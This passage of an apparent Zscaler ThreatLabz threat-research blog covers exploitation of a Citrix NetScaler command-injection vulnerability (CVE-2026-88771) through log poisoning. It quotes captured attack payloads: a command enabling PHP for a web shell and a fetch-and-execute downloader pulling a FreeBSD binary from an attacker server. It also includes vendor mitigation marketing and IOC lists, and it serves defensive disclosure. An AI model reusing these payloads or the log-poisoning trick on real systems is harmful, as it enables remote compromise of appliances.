  's/php_engine${{IFS}}off/php_engine${{IFS}}on/g'${{IFS}}/etc/httpd.conf;# XThis variant attempted to:Create web-accessible directories.Write the&nbsp;Nx_7508.html fingerprint file.Install the&nbsp;Nx_7508.php web shell.Enable PHP by modifying&nbsp;/etc/httpd.conf.Inline variant 2:pitboss PPE unexpectedly died NSPPE;fetch${IFS}-o${IFS}/var/kw2s11${IFS}http://209.141.43[.]95/files/kw2-freebsd-x64-s11;chmod${IFS}+x${IFS}/var/kw2s11;/var/kw2s11;# XThe command was designed to download a Rust-based 64-bit FreeBSD binary to&nbsp;/var/kw2s11, grant executable permissions, and run it.ThreatLabz identified the same download server in activity associated with exploitation of CVE-2026-75650, tracked as StyleSmuggler.CVE-2026-75650 is an unauthenticated template-engine injection vulnerability affecting Adobe Commerce and Magento Open Source. Adobe assigned it a CVSS v3.1 score of 10.0 and confirmed exploitation in the wild in security bulletin&nbsp;APSB26-146.The shared download infrastructure is notable because the two vulnerabilities target different platforms:CVE-2026-75650 affects Adobe Commerce and Magento Open Source systems.CVE-2026-88771 affects Citrix NetScaler ADC and Gateway appliances.This overlap raises the possibility that one operator or malware-distribution service maintained payloads for different platforms and opportunistically deployed them through vulnerabilities affecting internet-facing systems.ThreatLabz also observed a burst of exploitation attempts from at least 26 source IP addresses over approximately six to seven minutes. These attempts followed the same log-poisoning and FreeBSD payload-delivery sequence.Each source IP address sent a login request containing:A forged&nbsp;pitboss PPE failure string intended to poison the NetScaler log.A downloader designed to download and execute the 64-bit FreeBSD payload&nbsp;kw2-freebsd-x64-s11.&nbsp; Step 3: Delayed execution by a privileged scriptThe poisoned authentication data was written to&nbsp;/var/log/ns.log. The vulnerability is triggered when the legitimate NetScaler Perl script,&nbsp;/netscaler/ns_monuploadd_err.pl, processes Packet Processing Engine (PPE) failure records as part of the appliance’s diagnostic and core-file handling.Public analysis found that the script searches&nbsp;/var/log/ns.log, rotated NetScaler logs, and&nbsp;/var/log/messages for phrases such as:PPE missed too many heartbeatsPPE unexpectedly diedThe vulnerable Perl script incorporates part of the selected record into a shell command without properly escaping attacker-controlled shell metacharacters. If the script selects the forged record, the appended command executes with the script’s privileges.CERT-EU reported that the script selects the last matching record. This may explain why attackers repeatedly submit the trigger. They are attempting to ensure that their poisoned entry remains the most recent matching line when the maintenance script runs. ConclusionCVE-2026-88771 enables unauthenticated remote command execution on Citrix NetScaler by exploiting the appliance’s logging and diagnostic processes. ThreatLabz captured exploitation attempts involving log poisoning, payload spraying across multiple URLs, directory creation, PHP enablement, and inline payload delivery. How Zscaler can HelpZscaler’s&nbsp;cloud native Zero Trust network access (ZTNA) solution gives users fast, secure access to private apps for all users, from any location. Reduce your attack surface and the risk of lateral threat movement—no more internet-exposed remote access IP addresses, and secure inside-out brokered connections. Easy to deploy and enforce consistent security policies across campus and remote users.Zscaler Private Access™ (ZPA) allows organizations to secure private app access from anywhere. Connect users to apps, never the network, with AI-powered user-to-app segmentation. Prevent lateral threat movement with inside-out connections.Deploy comprehensive cyberthreat and data protection for private apps with integrated application protection, deception, and data protection.The following table shows the typical attack stages and the mitigations recommended by Zscaler.Attack StageRecommended MitigationMinimize the external attack surfaceEliminate externally exposed legacy assets like VPNs and firewalls which are often subject to these zero-day exploitation attempts by leveraging a Zero Trust architecture.Prevent compromiseDetonate unknown second-stage payloads with&nbsp;Advanced Cloud Sandbox.Route server egress through&nbsp;ZIA to detect/block post-compromise activity.Enable&nbsp;SSL/TLS inspection for all traffic, including trusted sources.Enable&nbsp;Advanced Threat Protection to block known C2 domains.Use&nbsp;Advanced Cloud Firewall, to extend C2 controls across all ports/protocols, including emerging C2.Prevent lateral threat movementUse ZPA to enforce least-privilege user-to-app segmentation for crown-jewel apps (employees and third parties).Use&nbsp;ZPA inline inspection to block exploitation attempts against private apps from compromised users.Use&nbsp;Zscaler Deception to detect and contain lateral movement or privilege escalation with decoy assets and accounts.Prevent data lossInspect outbound traffic across channels with&nbsp;Zscaler DLP.&nbsp; Zscaler CoverageThe Zscaler ThreatLabz team has deployed protection for CVE-2026-88771 with the following:Zscaler Advanced Threat ProtectionApp.Exploit.CVE-2026-88771Zscaler Private Access AppProtection6000544: Citrix NetScaler Remote Code Execution (CVE-2026-88771) Indicators of Compromise (IOCs)Potential network indicators&nbsp;Source IPs45.153.212[.]10146.233.40[.]2046.236.167[.]14346.33.33[.]9549.150.197[.]11978.190.152[.]6481.10.79[.]19782.167.14[.]795.105.74[.]172100.38.125[.]66102.213.132[.]123102.222.146[.]45103.181.212[.]245103.197.249[.]161103.83.146[.]100111.92.128[.]89114.145.49[.]215120.244.160[.]182125.62.88[.]26130.12.182[.]7154.183.158[.]198154.241.254[.]9174.60.63[.]37177.52.203[.]23183.63.88[.]2